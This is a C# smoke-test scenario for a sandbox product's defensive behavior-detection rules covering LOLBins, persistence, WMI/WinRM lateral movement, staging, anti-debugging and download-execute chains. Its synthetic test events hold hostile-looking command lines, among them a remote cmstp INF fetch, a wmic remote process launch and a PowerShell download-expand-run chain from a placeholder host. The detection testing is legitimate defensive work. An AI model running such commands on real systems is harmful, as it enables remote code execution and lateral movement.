using System.Text.Json;
using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.Rules;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Verifies the v22 defensive behavior rule batch for LOLBins, service and
/// scheduled-task persistence, WMI/WinRM lateral movement, staging,
/// anti-analysis checks, and download-execute chains without live E2E.
/// </summary>
internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenario
{
    private static readonly string[] RequiredRuleIds =
    [
        "lolbin-cmstp-remote-inf-proxy-execution",
        "lolbin-msbuild-inline-task-user-writable-project",
        "persistence-service-failurecommand-user-writable",
        "persistence-scheduled-task-comhandler-user-writable",
        "lateral-wmi-win32-process-create-remote-host",
        "lateral-winrm-invoke-command-remote-scriptblock",
        "staging-archive-extract-script-user-writable",
        "staging-hidden-script-then-lolbin-launch-correlation",
        "anti-analysis-debugger-check-exit-gate",
        "download-execute-iwr-expand-start-chain"
    ];

    private static readonly string[] RequiredTechniqueIds =
    [
        "T1218.003",
        "T1127.001",
        "T1543.003",
        "T1053.005",
        "T1047",
        "T1021.006",
        "T1027",
        "T1497.001",
        "T1105"
    ];

    private static readonly HashSet<string> RequiredRuleIdSet = new(RequiredRuleIds, StringComparer.OrdinalIgnoreCase);

    public string ScenarioId => "behavior.rules-defensive-matrix-v22";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var behaviorRulesPath = Path.Combine(context.RulesDirectory, "behavior-rules.json");
        var mitreMapPath = Path.Combine(context.RulesDirectory, "mitre-windows-map.json");
        SmokeAssert.True(File.Exists(behaviorRulesPath), "behavior-rules.json is missing.");
        SmokeAssert.True(File.Exists(mitreMapPath), "mitre-windows-map.json is missing.");

        var rules = RuleEngine.LoadRuleSet(behaviorRulesPath);
        SmokeAssert.True(
            string.Equals(rules.Version, "2026-07-12-v22-defensive-behavior-expansion", StringComparison.OrdinalIgnoreCase) ||
            string.Equals(rules.Version, "2026-07-12-v23-high-signal-behavior-expansion", StringComparison.OrdinalIgnoreCase) ||
            string.Equals(rules.Version, "2026-07-12-v25-r0-file-network-semantic-fields", StringComparison.OrdinalIgnoreCase) ||
            string.Equals(rules.Version, "2026-07-12-v26-self-noise-guard-hardening", StringComparison.OrdinalIgnoreCase),
            "Behavior rules should carry the v22 defensive behavior expansion version or a newer behavior/self-noise hardening version.");

        var mitreTechniqueIds = ReadMitreTechniqueIds(mitreMapPath);
        foreach (var techniqueId in RequiredTechniqueIds)
        {
            SmokeAssert.True(mitreTechniqueIds.Contains(techniqueId), $"MITRE technique '{techniqueId}' is missing from mitre-windows-map.json.");
        }

        var indexedRules = rules.Rules.ToDictionary(rule => rule.Id, StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"v22 defensive matrix rule '{ruleId}' is missing.");
            AssertRuleShape(rule!, mitreTechniqueIds);
        }

        var engine = new RuleEngine(rules);
        var positiveRuleIds = engine.Classify(CreatePositiveEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(positiveRuleIds.Contains(ruleId), $"Synthetic v22 event should match '{ruleId}'.");
        }

        var noiseRuleIds = engine.Classify(CreateNoiseEvents())
            .Where(finding => RequiredRuleIdSet.Contains(finding.RuleId))
            .Select(finding => finding.RuleId)
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .Order(StringComparer.OrdinalIgnoreCase)
            .ToList();
        SmokeAssert.True(
            noiseRuleIds.Count == 0,
            "Collection/VT/R0/self-noise should not trigger v22 rules: " + string.Join(", ", noiseRuleIds));

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = $"{RequiredRuleIds.Length} v22 defensive matrix rules match constrained evidence and suppress collection/VT/R0 noise."
        });
    }

    private static void AssertRuleShape(BehaviorRule rule, HashSet<string> mitreTechniqueIds)
    {
        SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.Title), $"Rule '{rule.Id}' should include an English title.");
        SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.Summary), $"Rule '{rule.Id}' should include an English summary.");
        SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.MitreTechniqueId), $"Rule '{rule.Id}' should include a MITRE technique ID.");
        SmokeAssert.True(mitreTechniqueIds.Contains(rule.MitreTechniqueId!), $"Rule '{rule.Id}' MITRE technique '{rule.MitreTechniqueId}' is missing from mitre-windows-map.json.");
        SmokeAssert.True(rule.EvidenceFields.Count > 0, $"Rule '{rule.Id}' should document evidence fields.");
        SmokeAssert.True(rule.Tags.Contains("mitre", StringComparer.OrdinalIgnoreCase), $"Rule '{rule.Id}' should carry a mitre tag.");
        SmokeAssert.True(HasStrongPredicate(rule), $"Rule '{rule.Id}' should use constrained regex/all/exact/numeric predicates.");
        SmokeAssert.True(
            rule.ExcludeProcessNames.Contains("KSword.Sandbox.Agent.exe", StringComparer.OrdinalIgnoreCase) &&
            rule.ExcludeProcessNames.Contains("KSword.Sandbox.R0Collector.exe", StringComparer.OrdinalIgnoreCase),
            $"Rule '{rule.Id}' should exclude sandbox plumbing process names.");
        SmokeAssert.True(
            ContainsGuard(rule.ExcludeDataContains, "source", "virustotal") &&
            ContainsGuard(rule.ExcludeDataContains, "source", "r0collector") &&
            ContainsGuard(rule.ExcludeDataContains, "vtStatus", "not_configured") &&
            ContainsGuard(rule.ExcludeDataContains, "healthStatus", "collection-health") &&
            ContainsGuard(rule.ExcludeDataContains, "collectorSelfNoise", "true") &&
            ContainsGuard(rule.ExcludeDataContains, "collectorNoise", "true") &&
            ContainsGuard(rule.ExcludeDataEquals, "behaviorCounted", "false") &&
            ContainsGuard(rule.ExcludeDataEquals, "nonbehavior", "true"),
            $"Rule '{rule.Id}' should guard collection, VT, behaviorCounted/nonbehavior, and R0/self-noise data.");
    }

    private static bool HasStrongPredicate(BehaviorRule rule)
    {
        return rule.AllContainsCommandLine.Count > 0 ||
            rule.CommandLineRegex.Count > 0 ||
            rule.AllDataKeys.Count > 0 ||
            rule.AllDataContains.Count > 0 ||
            rule.DataContainsAll.Count > 0 ||
            rule.DataRegex.Count > 0 ||
            rule.AllDataRegex.Count > 0 ||
            rule.AllDataNumericRanges.Count > 0;
    }

    private static bool ContainsGuard(IReadOnlyDictionary<string, List<string>> guards, string key, string expected)
    {
        return guards.TryGetValue(key, out var values) &&
            values.Any(value => value.Contains(expected, StringComparison.OrdinalIgnoreCase));
    }

    private static IReadOnlyList<SandboxEvent> CreatePositiveEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "cmstp.exe",
                CommandLine = @"cmstp.exe /s /au https://download.example.test/profile.inf"
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "MSBuild.exe",
                CommandLine = @"MSBuild.exe C:\Users\Smoke\Downloads\inline.csproj /t:Build UsingTask CodeTaskFactory"
            },
            new SandboxEvent
            {
                EventType = "registry.set",
                Source = "driver",
                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
                Data =
                {
                    ["path"] = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
                    ["valueName"] = "FailureCommand",
                    ["value"] = @"C:\Users\Public\recover.cmd"
                }
            },
            new SandboxEvent
            {
                EventType = "scheduled_task.created",
                Source = "guest",
                Data =
                {
                    ["taskName"] = @"\Smoke\ComHandler",
                    ["taskAction"] = "ComHandler",
                    ["handlerPath"] = @"C:\Users\Public\taskhandler.dll"
                }
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "wmic.exe",
                CommandLine = @"wmic /node:server01 /user:DOMAIN\alice process call create C:\Users\Public\payload.exe",
                Data =
                {
                    ["operation"] = "Win32_Process process call create"
                }
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "powershell.exe",
                CommandLine = "powershell.exe Invoke-Command -ComputerName server01 -ScriptBlock { whoami }"
            },
            new SandboxEvent
            {
                EventType = "artifact.dropped_file.copied",
                Source = "guest",
                Data =
                {
                    ["archivePath"] = @"C:\Users\Smoke\Downloads\stage.zip",
                    ["extractedPath"] = @"C:\Users\Smoke\AppData\Local\Temp\stage.ps1"
                }
            },
            new SandboxEvent
            {
                EventType = "behavior.staging_correlation",
                Source = "guest",
                Data =
                {
                    ["stagedPath"] = @"C:\Users\Smoke\AppData\Roaming\hidden.js",
                    ["launcherProcessName"] = "wscript.exe",
                    ["attributes"] = "hidden archive",
                    ["correlationId"] = "stage-1"
                }
            },
            new SandboxEvent
            {
                EventType = "antiAnalysis.sandboxCheck",
                Source = "guest",
                Data =
                {
                    ["api"] = "IsDebuggerPresent",
                    ["action"] = "exit"
                }
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "powershell.exe",
                CommandLine = @"powershell.exe Invoke-WebRequest http://example.test/a.zip -OutFile C:\Users\Public\a.zip; Expand-Archive C:\Users\Public\a.zip C:\Users\Public\a; Start-Process C:\Users\Public\a\run.exe",
                Data =
                {
                    ["outputPath"] = @"C:\Users\Public\a.zip",
                    ["executedPath"] = @"C:\Users\Public\a\run.exe"
                }
            }
        ];
    }

    private static IReadOnlyList<SandboxEvent> CreateNoiseEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "KSword.Sandbox.Agent.exe",
                CommandLine = @"cmstp.exe /s /au C:\Users\Public\profile.inf"
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "virustotal",
                ProcessName = "powershell.exe",
                CommandLine = @"powershell.exe Invoke-Command -ComputerName server01 -ScriptBlock { whoami }",
                Data =
                {
                    ["source"] = "virustotal",
                    ["vtStatus"] = "not_configured"
                }
            },
            new SandboxEvent
            {
                EventType = "registry.set",
                Source = "r0collector",
                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
                Data =
                {
                    ["source"] = "r0collector",
                    ["collectorSelfNoise"] = "true",
                    ["path"] = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
                    ["valueName"] = "FailureCommand",
                    ["value"] = @"C:\Users\Public\recover.cmd"
                }
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "msbuild.exe",
                CommandLine = @"MSBuild.exe C:\src\trusted.csproj /t:Build"
            }
        ];
    }

    private static HashSet<string> ReadMitreTechniqueIds(string mitreMapPath)
    {
        using var document = JsonDocument.Parse(File.ReadAllText(mitreMapPath));
        SmokeAssert.True(document.RootElement.TryGetProperty("techniques", out var techniques), "MITRE map should contain a techniques array.");

        var techniqueIds = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var technique in techniques.EnumerateArray())
        {
            if (technique.TryGetProperty("id", out var idElement))
            {
                var id = idElement.GetString();
                if (!string.IsNullOrWhiteSpace(id))
                {
                    techniqueIds.Add(id);
                }
            }
        }

        return techniqueIds;
    }
}
